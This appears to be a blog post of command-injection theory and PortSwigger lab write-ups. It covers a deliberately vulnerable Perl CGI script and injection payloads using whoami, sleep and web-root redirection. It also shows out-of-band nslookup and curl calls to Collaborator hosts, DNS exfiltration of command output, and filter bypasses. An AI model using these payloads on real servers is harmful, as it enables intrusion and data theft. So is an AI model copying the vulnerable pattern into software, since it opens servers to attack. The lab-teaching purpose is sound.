---
title: "Command_Injection"
date: 2026-05-04
draft: false

description: "Theory, testing methodology, write ups and common attack techniques for Command_Injection."

tags:
  - Command-injection
  

categories:
  - concepts
  - Labs-Solution

---

# Command Injection

  Description.

  Command injection (also known as OS command injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server hosting an application. This typically occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell without proper validation or sanitization.

# Dangerous Functions by Platform

  PHP: 

  `exec(), shell_exec(), system(), passthru(), proc_open(), popen(),etc...`

  Java: 

  `Runtime.exec(),ProcessBuilder,etc...`

  Python: 

  `os.system(), os.popen(), subprocess.Popen(), subprocess.call(), eval(),etc...`
  
  JavaScript/Node.js: 

  `child_process.exec(), child_process.spawn(), child_process.execFile(),etc...`

  .NET (C#): 

  `Process.Start(), System.Diagnostics.Process,etc...`

### Example : Injecting via Perl

  ```perl
  #!/usr/bin/perl

  use strict;
  use CGI qw(:standard escapeHTML);

  print header, start_html("");
  print "<pre>";

  my $command = "du -h --exclude php* /var/www/html";
  $command = $command . param("dir");
  $command = `$command`;

  print "$command\n";
  print end_html;
  ```

  This script simply appends the value of the users
  supplied dir parameter to the end of a preset command, executes the command, 
  and displays the results which will be shown in directories if user that they want to view

  Example Url :

  `https://example.com/OvCgi/?dir=/public` 

  You can exploit this by using characters like ` ; , | , || , \n , $(),` etc and run command.

  Example : 

  `https://example.com/OvCgi/?dir=/public;whoami`

  Further more reading you can explore on :

  https://hacktricks.wiki/en/pentesting-web/command-injection.html
  
  `Dafydd Stuttard, Marcus Pinto - The web application hacker's handbook_ finding and exploiting security flaws-Wiley (2011)`

# Lab: OS command injection, simple case
  
  This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user‑supplied product and store IDs, then returns the output.

  Analysis :

  We have a product stock check functionality. 

  When we intercept the request of stock check function the response shows 

  like this `productId=1&storeId=2`
  
  What happens if we inject an additional command behind the storeID parameter value ?

  Exploitation :

  Intercept the stock check request in Burp. Modify the storeId parameter to inject `whoami`

  `storeId=2; whoami`

  Send the request. 

  ![whoami](/images/commandinjection/whoami.PNG)

  The response contains the output of whoami appended to the stock information.

# Lab: Blind OS command injection with time delays
  
  This lab contains a blind OS command injection vulnerability in the feedback submission function. 
  
  The application does not return command output, but you can detect injection using time delays.

  Analysis :

  There is a feedback form and we will exploit base on that 

  Exploit :

  When we put the payloads like ` ; sleep 10 #` or `||sleep+10||` by URL encoded (CRTL+U) in burp in each input field of feedback form.

  ![delay](/images/commandinjection/delay.PNG)

  We can see it works on email field input by delaying 10 seconds.

# Lab: Blind OS command injection with output redirection

  This lab contains a blind OS command injection vulnerability. The application does not return output, but you can redirect command output to a file in a web‑accessible location, then retrieve it.

  Analysis :

  Same feedback form as before – blind injection. Time delays work, but this lab requires reading output.

  We can use output redirection (>) to write command results into a static file inside the web root, then fetch that file.

  Web root common paths :

  `/var/www/html/`

  `/var/www/`

  `/usr/local/apache2/htdocs/`

  The given path in the lab is `/var/www/images/`

  We can write to output.txt and visit `/var/www/images/output.txt`

  Exploitation :

  When we put the payloads like ` %0a sleep 10 #` or `||sleep+10||` by URL encoded (CRTL+U) in burp in each input field of feedback form.

  ![delay](/images/commandinjection/delay.PNG)

  We can see it works on email field input by delaying 10 seconds.

  We can use ` %0a whoami > /var/www/images/output.txt #` by URL encoded (CRTL+U) we can see it is redirects.

  ![redirect](/images/commandinjection/redirect.PNG)

  When we go back to Home and look for images file we can see there is the output.txt can be see in images url.

  `https://0a4300a40460df418015fd1f001d0097.web-security-academy.net/image?filename=output.txt`

# Lab: Blind OS command injection with out-of-band interaction
  
  This lab contains a blind OS command injection vulnerability. The application does not return output and has no writable web root.

  Analysis :

  No output, no file write access.

  We can use nslookup, dig, curl, or wget to make the server send a request to our Burp Collaborator or custom listener.

  Linux OOB payloads:
  
  ` ; nslookup collaborator-id.burpcollaborator.net `
  
  ` ; curl http://collaborator-id.burpcollaborator.net `

  Exploitation :

  We can put this payload in each field and poll in burp collaborator to know which parameter is vulnerable.

  ` & nslookup nsjw3qkytf2h2go2bfgxh2v7dyjp7fv4.oastify.com #` (CRTL+U url encoded)

  ![poll](/images/commandinjection/poll.PNG)

  We can see it is vulnerable in email parameter.

# Lab: Blind OS command injection with out-of-band data exfiltration
  
  This lab extends the previous one – you not only need OOB interaction but also must exfiltrate sensitive data (e.g., the 

  current username) via the OOB channel.

  Analysis :

  Same blind injection, but now you need to steal data – not just prove injection. 

  Combine command substitution with DNS or HTTP exfiltration.

  DNS exfiltration (Linux):
  
  ` ; nslookup $(whoami).collaborator-id.burpcollaborator.net`

  The subdomain will contain the command output in the DNS query name.

  Exploitation :

  We can use the same payload from above lab to know which parameter is vulnerable.

  We will use this payload to exfiltrate sensitive data

  `+%26+nslookup+$(whoami).kxlt8npvyc7e7dtzgclumz04ivonce03.oastify.com+%23` (already encode version)

  ![sensitive](/images/commandinjection/sensitive.PNG)

  And we see there is the value of `whoami` command.

  Tips :

  Character usually work is - `%0a` try this if there is character need to bypass. 

  You can also go to payload all things command injection category to understand more payloads to use.

  Space Bypass - `${IFS}` , `%09` ( which is tab key encode value version )


















